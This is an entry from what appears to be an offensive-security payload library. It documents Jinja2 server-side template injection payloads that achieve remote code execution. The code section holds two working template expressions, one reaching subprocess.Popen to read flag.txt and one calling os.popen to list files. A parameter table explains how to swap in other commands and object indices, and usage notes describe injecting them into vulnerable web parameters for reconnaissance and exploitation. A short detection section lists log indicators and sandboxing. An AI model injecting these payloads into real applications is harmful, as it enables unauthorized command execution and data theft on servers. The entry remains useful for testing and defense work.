---
id: e9e7a531-3afc-44ff-a79a-d5b7d4ca2987
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:39.818084+00:00'
updated_at: '2023-04-10T20:23:47.441922+00:00'
platforms:
  - Web
  - Linux
tags:
  - ssti
  - jinja2
  - rce
  - payload
validated: true
---

# Jinja2-SSTI-Subprocess-Popen-RCE-Payload

## Code

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

## Description

This Jinja2 template payload exploits SSTI vulnerabilities to achieve remote code execution. The first expression accesses subprocess.Popen via Python's method resolution order (MRO) and subclasses to run a shell command (default: 'cat flag.txt'), capturing and stripping the output for display in the response. The second expression uses the config object's globals to invoke os.popen for listing the current directory contents. It targets unsanitized template rendering in web apps, enabling server-side command execution without direct shell access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'cat flag.txt' | Shell command to execute via subprocess.Popen | 'whoami' or 'id' |
| Index [396] | Position of subprocess.Popen in __subclasses__() (may vary by Python version) | [402] for alternative versions |

## Usage

Inject this payload into a vulnerable Jinja2-rendered parameter (e.g., a search query or template variable) via HTTP request (GET/POST). Customize the shell command for specific reconnaissance or exploitation, such as file reads or downloads. Used in procedures like [[procedures/Jinja2-SSTI-Remote-Code-Execution-via-subprocess-Popen]] after confirming SSTI with basic math expressions.

## Detection

- Web logs showing template evaluation with '__class__', 'mro', 'subclasses', or 'subprocess' strings.
- Anomalous shell command execution in application/server logs (e.g., via auditd or Python tracebacks).
- Unexpected file access or output in HTTP responses, such as directory listings or file contents.
- WAF alerts on SSTI patterns; enable Jinja2 sandboxing to block unsafe attribute access.
